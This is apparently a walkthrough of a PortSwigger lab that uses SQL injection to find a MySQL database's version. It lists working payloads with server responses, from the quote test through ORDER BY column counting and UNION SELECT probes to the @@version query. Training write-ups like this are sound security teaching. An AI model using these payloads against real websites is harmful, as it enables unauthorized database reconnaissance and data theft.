## [Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)


### Steps

1. **Access the Lab**  
   - Go to the lab and click on the "Accessories" category. This sends a request like:  
     `GET /filter?category=Accessories`.

2. **Set Up Burp Suite**  
   - Open Burp Suite Community Edition and configure it to intercept browser requests.  
   - Intercept the `GET /filter?category=Accessories` request to manipulate the `category` parameter.

3. **Test for SQL Injection**  
   - Modify the `category` parameter to include a single quote: `category=Accessories'`.  
   - If the server responds with an error, it indicates a potential SQL injection vulnerability.

4. **Determine Number of Columns**  
   - Use an `ORDER BY` clause to find the number of columns in the query:  
     - `category=Accessories' order by 1--`: Error (likely due to incorrect comment syntax).  
     - `category=Accessories' order by 1#`: 200 OK (MySQL comment syntax works).  
     - `category=Accessories' order by 2#`: 200 OK (two columns confirmed).  
     - `category=Accessories' order by 3#`: 500 Internal Server Error (no third column).  
   - **Result**: The query returns two columns.

5. **Determine Column Data Types**  
   - Test which columns accept string data using a `UNION SELECT` payload:  
     - `category=Accessories' UNION SELECT NULL,'a'#`: 200 OK.  
     - `category=Accessories' UNION SELECT 'a','a'#`: 200 OK.  
     - `category=Accessories' UNION SELECT NULL,NULL#`: 200 OK.  
     - `category=Accessories' UNION SELECT 'a',NULL#`: 200 OK.  
   - **Result**: Both columns accept string data (since all payloads return 200 OK).

6. **Retrieve Database Version**  
   - Use a `UNION SELECT` to query the database version:  
     - `category=Accessories' UNION SELECT @@version,NULL#`.  
   - Send the request in Burp Repeater.  
   - **Result**: The response displays the MySQL version on the page.

7. **Verify and Submit**  
   - Render the response in Burp or paste the URL into the browser to confirm the version appears.  
   - If a "Congratulations" message pops up, the lab is solved!

#### Notes
- The `#` comment syntax is key for MySQL, as `--` caused errors.  
